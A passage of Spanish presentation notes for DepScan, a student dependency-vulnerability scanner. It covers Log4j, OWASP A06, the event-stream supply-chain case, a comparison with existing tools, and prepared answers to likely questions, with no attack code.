**Por qué fue tan grave:**
1. **Facilísima de explotar:** una sola cadena de texto.
2. **Ubicua y escondida:** la mayoría de organizaciones **no sabía que la usaba**, porque venía como **dependencia transitiva** dentro de otros productos o librerías. Lo primero que tuvieron que hacer miles de empresas fue preguntarse "¿dónde tenemos Log4j?", y no tenían cómo responder rápido.
3. **La primera corrección no bastó:** la versión **2.15.0** corrigió la falla original, pero enseguida se publicó otra (CVE-2021-45046) que también la afectaba; luego hubo que pasar a la **2.16.0** y después a la **2.17.0** (y 2.17.1) por nuevas fallas relacionadas.

**Relación con DepScan.** Justifica dos funciones:
- **Resolver las transitivas** desde el lockfile: el 97 % de NodeGoat es la versión npm del "no sabía que tenía Log4j".
- **Remediación verificada** (diapositiva 18): quien actualizaba a "la versión corregida del aviso" (2.15.0) seguía vulnerable. DepScan evalúa la versión recomendada contra **todos** los avisos del paquete, justo para evitar eso.

## 3. OWASP Top 10 — A06:2021 "Componentes vulnerables y desactualizados"

**Qué es OWASP.** Open Worldwide Application Security Project, una fundación sin fines de lucro. Su **Top 10** es la lista de referencia de los riesgos más críticos en aplicaciones web, usada por empresas, auditores y universidades.

**La categoría A06:2021.** Dice que una aplicación está en riesgo si:
- No conoces las versiones de todos los componentes que usas, **incluidas las dependencias anidadas** (transitivas).
- Usas software vulnerable, sin soporte o desactualizado.
- No buscas vulnerabilidades de forma periódica.
- No actualizas a tiempo.

Entre las prevenciones que recomienda está **mantener un inventario de versiones** y **monitorear continuamente fuentes como CVE y NVD** con herramientas automatizadas.

**Relación con DepScan.** Es casi la definición del sistema: inventario de versiones exactas + consulta a OSV/NVD + integración continua. Sirve como respaldo "institucional": no es una preocupación nuestra, es una de las diez principales del sector.

> Dato extra por si preguntan: en la edición **OWASP Top 10:2025** esta categoría se amplió a "fallas en la cadena de suministro de software", lo que refuerza la relevancia del tema. (Verifícalo antes si piensas mencionarlo.)

## 4. Caso extra (está en el FD05, no en la diapositiva): event-stream (npm, 2018)

`event-stream` era un paquete npm muy usado (alrededor de 2 millones de descargas semanales). Su mantenedor original cedió el control a un desconocido, que agregó una nueva dependencia, `flatmap-stream`, con **código malicioso** escondido. Ese código se activaba solo dentro de la aplicación Copay, una billetera de bitcoin, para robar fondos. Lo importante: el código malicioso llegó **como dependencia transitiva**, sin que nadie lo instalara a propósito.

**Relación con DepScan y su límite.** Una vez publicado el aviso, DepScan lo detecta como cualquier otro. Pero **antes** de que exista el aviso no puede saberlo, porque no descubre fallas nuevas (limitación declarada en la diapositiva 6). Úsalo si te preguntan por ataques a la cadena de suministro en npm.

## 5. "Lo que ya existe" (parte inferior de la diapositiva 3)

| Recurso | Qué es | Por qué no basta |
|---|---|---|
| **OSV** (Google) | Base abierta de vulnerabilidades de código abierto; API gratuita con consultas en lote. | Son los datos, no una herramienta para el usuario final. |
| **NVD** (NIST, EE. UU.) | Base oficial de CVE con puntaje CVSS. | Mala cobertura por nombre de paquete npm y límite de 5 consultas cada 30 s. |
| `npm audit` | Viene con npm. | Solo npm, consola, en inglés, repite avisos y no verifica la versión sugerida. |
| `pip-audit` | Equivalente para Python. | Solo PyPI y de consola. |
| OSV-Scanner | CLI de Google. | Sin interfaz web, en inglés, no da versión segura verificada ni mitigaciones. |
| Snyk | Plataforma comercial. | Costo por desarrollador; plan gratuito limitado. |

**La idea para defender el proyecto:** como los datos son públicos y gratuitos, **el aporte no puede ser "consultar una API"**. El aporte es el motor propio (parsers, resolver, comparadores semver y PEP 440), la deduplicación, la remediación verificada, la interfaz en español y la medición con el benchmark. Así se evita la crítica de "esto ya existe" (que el propio planteamiento en `proyecto.md` reconoce).

---

# Preguntas probables y cómo responderlas

**"¿En qué parte del código ocurre cada uno de los 7 pasos?"** *(la pregunta del ingeniero; ver diapositivas 15 y 17)*
> Todos los orquesta una función: `scanProject()` en `packages/core/src/scan.ts`. **Leer** lo hacen los parsers de `parsers/npm` y `parsers/pypi`; **resolver**, `resolver/resolve.ts`; **consultar**, `queryBatch()` de `sources/osv/osv-client.ts`; **detallar**, `getVulnerability()` y luego `dedupe()` de `analysis/analyze.ts`; **enriquecer**, `nvd-client.ts`; **analizar**, `buildFinding()` y `buildRemediation()` de `analysis/remediation.ts`; y **reportar**, `summarize()` más `db.saveScan()` en la API o `shouldFail()` en la CLI. Si quiere, lo mostramos en el mapa de archivos (diapositiva 17).

**"¿El diagrama de actividades es el real o uno idealizado?"**
> Es el real: cada caja tiene debajo la función que se ejecuta y cada rombo es un `if` de `scan.ts` (estimar, hay consultas, NVD, remediación). El generador de diagramas está en `docs/presentacion/diagramas.mjs`, junto al código.

**"¿Esto no es solo consultar una API?"**
> No. OSV solo responde "esta versión exacta tiene estos avisos". Para llegar ahí hay que leer los manifiestos, resolver la versión exacta de más de mil dependencias, compararlas con comparadores propios de semver y PEP 440, deduplicar y, sobre todo, calcular una versión segura contra todos los avisos. Eso es lógica nuestra, cubierta con pruebas automatizadas.

**"¿Por qué `npm audit` encuentra más que ustedes?"**
> Encuentra los mismos. La diferencia de 4 son avisos GHSA que comparten el mismo CVE: es la misma falla contada dos veces. En el benchmark hay cero fallas que `npm audit` encuentre y DepScan no.

**"¿Qué pasa si el proyecto no tiene lockfile?"**
> Se avisa que la versión no se puede determinar, o, con la opción de estimar, se consulta el registro y se marca como estimación. No inventamos versiones.

**"¿Si una librería es vulnerable, mi aplicación es atacable?"**
> No necesariamente: depende de si el código usa la función afectada (alcanzabilidad). Es una limitación declarada y está en el trabajo futuro.

**"¿Por qué SQLite y no una base de datos 'de verdad'?"**
> Para este volumen (historial, usuarios, caché, una réplica) SQLite es suficiente, no requiere servidor ni costo, y está incluido en Node 24. Si el sistema escalara a varias réplicas, el repositorio está aislado y se podría cambiar a PostgreSQL.

**"¿Cómo protegen los tokens de GitHub?"**
> Se cifran con AES-256-GCM antes de guardarse; las cookies son HttpOnly, Secure y SameSite, y la sesión se regenera tras el login.

**"¿Equifax es Java, por qué lo usan si ustedes no cubren Maven?"**
> Porque ilustra el tipo de problema, que es idéntico en npm y PyPI. Agregar Maven es trabajo futuro y la arquitectura hexagonal lo hace sencillo: un parser y un comparador nuevos.
